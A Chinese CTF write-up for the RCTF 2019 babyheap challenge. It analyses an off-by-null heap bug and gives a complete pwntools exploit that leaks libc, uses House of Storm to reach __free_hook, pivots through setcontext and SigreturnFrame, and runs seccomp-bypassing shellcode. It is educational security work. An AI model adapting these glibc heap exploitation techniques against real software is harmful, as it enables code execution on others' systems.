# RCTF 2019 bayheap

### 0x0 前置补偿

[setcontext 函数exploit](http://blog.eonew.cn/archives/993)

[House_of_Storm]([https://n132.github.io/2019/05/07/2019-05-07-House-of-Storm/#%E4%B8%80%E4%B8%AA%E5%8F%AF%E4%BB%A5%E4%B8%8D%E7%9C%8B%E7%9A%84%E5%B0%8F%E9%97%AE%E9%A2%98](https://n132.github.io/2019/05/07/2019-05-07-House-of-Storm/))

### 0x1 分析

看一下安全性：

```shell
➜  rctf_2019_babyheap checksec rctf_2019_babyheap
[*] './rctf_2019_babyheap'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

很常规的防护全开了。

程序逻辑很简单，增删改查都有。

`main()`

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  __int64 savedregs; // [rsp+10h] [rbp+0h]

  init();
  while ( 1 )
  {
    menu();
    get_int();
    switch ( (unsigned int)&savedregs )
    {
      case 1u:
        add();
        break;
      case 2u:
        edit();
        break;
      case 3u:
        delete();
        break;
      case 4u:
        show();
        break;
      case 5u:
        puts("See you next time!");
        exit(0);
        return;
      default:
        puts("Invalid choice!");
        break;
    }
  }
}
```

首先有个`init()`来做一些设置：

```c
unsigned __int64 init()
{
  int fd; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);                 // 
                                                // 
  fd = open("/dev/urandom", 0);
  if ( fd < 0 )
  {
    puts("open failed!");
    exit(-1);
  }
  read(fd, &ptrs, 8uLL);
  close(fd);                                    // 
                                                // 
  ptrs = (void *)((unsigned int)ptrs & 0xFFFF0000);
  mallopt(1, 0);                                // 
                                                // 
  if ( mmap(ptrs, 0x1000uLL, 3, 34, -1, 0LL) != ptrs )
  {
    puts("mmap error!");
    exit(-1);
  }
  signal(14, (__sighandler_t)timeout_handler);  // 
                                                // 
  alarm(0x3Cu);
  if ( prctl(38, 1LL, 0LL, 0LL, 0LL) )
  {
    puts("Could not start seccomp:");
    exit(-1);
  }
  if ( prctl(22, 2LL, &filterprog) == -1 )
  {
    puts("Could not start seccomp:");
    exit(-1);
  }
  return __readfsqword(0x28u) ^ v2;
}
```

关闭了Fastbin，通过`mmap`申请了一块匿名空间来存放`chunk`指针。

而且禁止了`SYS_execve`调用。

`add()`:

```c
unsigned __int64 add()
{
  void **v0; // rbx
  __int64 idx; // [rsp+0h] [rbp-20h]
  int _idx; // [rsp+0h] [rbp-20h]
  int size; // [rsp+4h] [rbp-1Ch]
  unsigned __int64 v5; // [rsp+8h] [rbp-18h]

  v5 = __readfsqword(0x28u);
  LODWORD(idx) = 0;
  while ( *((_QWORD *)ptrs + 2 * (signed int)idx) && (signed int)idx <= 15 )
    LODWORD(idx) = idx + 1;
  if ( (_DWORD)idx == 16 )
  {
    puts("You can't");
    exit(-1);
  }
  printf("Size: ", idx);
  size = get_int();
  if ( size <= 0 || size > 0x1000 )
  {
    puts("Invalid size :(");
  }
  else
  {
    *((_DWORD *)ptrs + 4 * _idx + 2) = size;    // |ptr |size|
    v0 = (void **)((char *)ptrs + 0x10 * _idx);
    *v0 = calloc(size, 1uLL);
    puts("Add success :)");
  }
  return __readfsqword(0x28u) ^ v5;
}
```

在匿名空间的布局大概是这样`|ptr |size|`。

`edit()`

```c
unsigned __int64 edit()
{
  int _idx; // ST00_4
  int v1; // ST04_4
  __int64 idx; // [rsp+0h] [rbp-10h]
  unsigned __int64 v4; // [rsp+8h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  printf("Index: ");
  LODWORD(idx) = get_int();
  if ( (signed int)idx >= 0 && (signed int)idx <= 15 && *((_QWORD *)ptrs + 2 * (signed int)idx) )
  {
    printf("Content: ", idx);
    v1 = read_n(*((void **)ptrs + 2 * _idx), *((_DWORD *)ptrs + 4 * _idx + 2));
    *(_BYTE *)(*((_QWORD *)ptrs + 2 * _idx) + v1) = 0;// off by null
    puts("Edit success :)");
  }
  else
  {
    puts("Invalid index :(");
  }
  return __readfsqword(0x28u) ^ v4;
}
```

这里有一个`off by null`漏洞

`delete()`

```c
unsigned __int64 delete()
{
  int idx; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  printf("Index: ");
  idx = get_int();
  if ( idx >= 0 && idx <= 15 && *((_QWORD *)ptrs + 2 * idx) )
  {
    free(*((void **)ptrs + 2 * idx));
    *((_QWORD *)ptrs + 2 * idx) = 0LL;          // no UAF
    *((_DWORD *)ptrs + 4 * idx + 2) = 0;
    puts("Delete success :)");
  }
  else
  {
    puts("Invalid index :(");
  }
  return __readfsqword(0x28u) ^ v2;
}
```

删除之后直接清零了，没有UAF。

`show()`

```c
unsigned __int64 show()
{
  int idx; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  printf("Index: ");
  idx = get_int();
  if ( idx >= 0 && idx <= 15 && *((_QWORD *)ptrs + 2 * idx) )
    puts(*((const char **)ptrs + 2 * idx));
  else
    puts("Invalid index :(");
  return __readfsqword(0x28u) ^ v2;
}
```

这个很干脆，直接输出内容。

跟之前的`heapstorm`差不多思路：

1. Leak libc
2. house of storm 申请到`__free_hook`
3. 然后由于我们不能直接用gadget，我们可以将`__free_hook`附近的区域填入构造好的`shellcode`，设置权限拿到shell。

#### leak libc

通过`posion by null`来构造重叠的`chunk`来泄漏放在unsorted bin 中的`chunk`，从而得到`libc`。

```python
#libc base
add(0x500)  #0
add(0x88)   #1
add(0x88)   #2

delete(0)
add(0x18)   #0
edit(0,"A"*0x18)	#overflow by null
add(0x88)   #3
add(0x88)   #4 
delete(3)
delete(1)
```

这样我们就把`idx4`放进了unsorted bin 中，它与`idx1 idx3`重叠了。

```python
add(0x2d8)  #1  back of idx0 in unsorted bin
add(0x88)   #3  == old idx3
add(0x48)   #5  == old idx4
delete(4)
view(5)
base = u64(p.readline()[:-1].ljust(8,'\x00')) - 88 - 0x3c4b20
libc.address = base
log.warning(hex(base))
```

首先我们把unsorted bin中首先加入的`0x500`的剩余部分申请掉。

然后再次申请就能得到`idx4`部分的内存，即`idx 5`。

然后`free(idx4)`。就可以泄漏到`main_arena`，从而拿到`libc`。

⚠️这里操作结束后要把unsorted bin中的内存清掉：

`add(0x458 + 0x90) #4 == 0x510 + 0x90 - 0x20 - 0x90`

#### get __free_hook

通过house of storm来申请任意空间：

```python
add(0x500)  #6
add(0x88)   #7
add(0x88)   #8
delete(6)
add(0x18)   #6
edit(6,"A"*0x18)
add(0x88)   #9
add(0x88)   #10
delete(9)
delete(7)
add(0x2d8)  #7 trash
add(0x78)   #9 == old idx 9
add(0x48)   #11 == idx10 - 0x10
add(0x4a9)  #12 unsorted bin to large bin
```

跟上面的思路相同，先`poison by null`拿到可以控制`idx10`的`idx11`。

并申请`idx12`，把之前申请完`idx9 idx11`之后的剩余部分放入large bin，我们就可以通过`idx10`来控制`fwd`。

```python
payload = flat([
    p64(0)*6,
    p64(0),
    p64(0x4a1),
    p64(0),
    p64(storage-0x20+8)+p64(0)+p64(storage-0x20-0x18-5)
])
edit(10, payload)   #edit the head of largebinchunk

payload = flat([
    p64(0),
    p64(0x21),
    p64(0x21)*6
])
edit(11, payload)   #idx10->size = 0x21

delete(10)  #idx10 into unsorted bin
edit(11,p64(0)+p64(0x4b1)+p64(0)+p64(fake_chunk))#edit idx 10 the head and bk in unsorted bin
add(0x48)   #10 __free_hook - 0x20
```

跟之前的题目思路相同，最终修改`size`，拿到`__free_hook`那部分内存。

#### setcontext

由于我们不能使用`gadget`，但是我们可以使用直接读取`flag`。所以我们通过`setcontext`来获得`flag`。

大体上是将`__free_hook`设置为`setcontext+53`的地址来调整栈空间，然后将`shellcode`放到`__free_hook`附近，就会运行到这里，拿到`shell`。

这方面的具体内容可以看上面的前置补偿。

`shellcode`直接使用Ex师傅的了。

### 0x2 EXP

```python
#! /usr/bin/python
#-*- coding: utf-8 -*-
from pwn import *

context.arch='amd64'
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
p=process('./rctf_2019_babyheap')
# p = remote("node3.buuoj.cn", 28020)

def add(size):
	p.sendlineafter(": \n",str(1))
	p.sendlineafter("ize: ",str(size))

def edit(idx,c):
	p.sendlineafter(": \n",str(2))
	p.sendlineafter("dex: ",str(idx))
	p.sendafter("tent: ",c)

def delete(idx):
	p.sendlineafter(": \n",str(3))
	p.sendlineafter("dex: ",str(idx))

def view(idx):
	p.sendlineafter(": \n",str(4))
	p.sendlineafter("dex: ",str(idx))

#libc base
add(0x500)  #0
add(0x88)   #1
add(0x88)   #2

delete(0)
add(0x18)   #0
edit(0,"A"*0x18)
add(0x88)   #3
add(0x88)   #4 
delete(3)
delete(1)

add(0x2d8)  #1  back of idx0 in unsorted bin
add(0x88)   #3  == old idx3
add(0x48)   #5  == old idx4
delete(4)
view(5)
base = u64(p.readline()[:-1].ljust(8,'\x00')) - 88 - 0x3c4b20
libc.address = base
log.warning(hex(base))
add(0x458 + 0x90) #4 == 0x510 + 0x90 - 0x20 - 0x90

#House of Storm
storage = libc.sym['__free_hook']
fake_chunk = storage - 0x20

add(0x500)  #6
add(0x88)   #7
add(0x88)   #8
delete(6)
add(0x18)   #6
edit(6,"A"*0x18)
add(0x88)   #9
add(0x88)   #10
delete(9)
delete(7)
add(0x2d8)  #7 trash
add(0x78)   #9 == old idx 9
add(0x48)   #11 == idx10 - 0x10
add(0x4a9)  #12 unsorted bin to large bin

payload = flat([
    p64(0)*6,
    p64(0),
    p64(0x4a1),
    p64(0),
    p64(storage-0x20+8)+p64(0)+p64(storage-0x20-0x18-5)
])
edit(10, payload)   #edit the head of largebinchunk

payload = flat([
    p64(0),
    p64(0x21),
    p64(0x21)*6
])
edit(11, payload)   #idx10->size = 0x21

delete(10)  #idx10 into unsorted bin
edit(11,p64(0)+p64(0x4b1)+p64(0)+p64(fake_chunk))#edit idx 10 the head and bk in unsorted bin
add(0x48)   #10 __free_hook - 0x20

#setcontext
new_execve_env = libc.sym['__free_hook'] & 0xfffffffffffff000
shellcode1 = '''
xor rdi, rdi
mov rsi, %d
mov edx, 0x1000

mov eax, 0
syscall

jmp rsi
''' % new_execve_env

edit(10, 'a' * 0x10 + p64(libc.sym['setcontext'] + 53) + p64(libc.sym['__free_hook'] + 0x10) + asm(shellcode1))

# pause()

context.arch = "amd64"
frame = SigreturnFrame()
frame.rsp = libc.sym['__free_hook'] + 8
frame.rip = libc.sym['mprotect']
frame.rdi = new_execve_env
frame.rsi = 0x1000
frame.rdx = 4 | 2 | 1

edit(12, str(frame))
p.sendline('3')
p.recvuntil('Index: ')
p.sendline('12')

shellcode2 = '''
mov rax, 0x67616c662f2e ;// ./flag
push rax

mov rdi, rsp ;// ./flag
mov rsi, 0 ;// O_RDONLY
xor rdx, rdx ;// 置0就行
mov rax, 2 ;// SYS_open
syscall

mov rdi, rax ;// fd
mov rsi,rsp  ;// 读到栈上
mov rdx, 1024 ;// nbytes
mov rax,0 ;// SYS_read
syscall

mov rdi, 1 ;// fd
mov rsi, rsp ;// buf
mov rdx, rax ;// count
mov rax, 1 ;// SYS_write
syscall

mov rdi, 0 ;// error_code
mov rax, 60
syscall
'''

p.send(asm(shellcode2))

print(p.recv())

p.interactive()
```

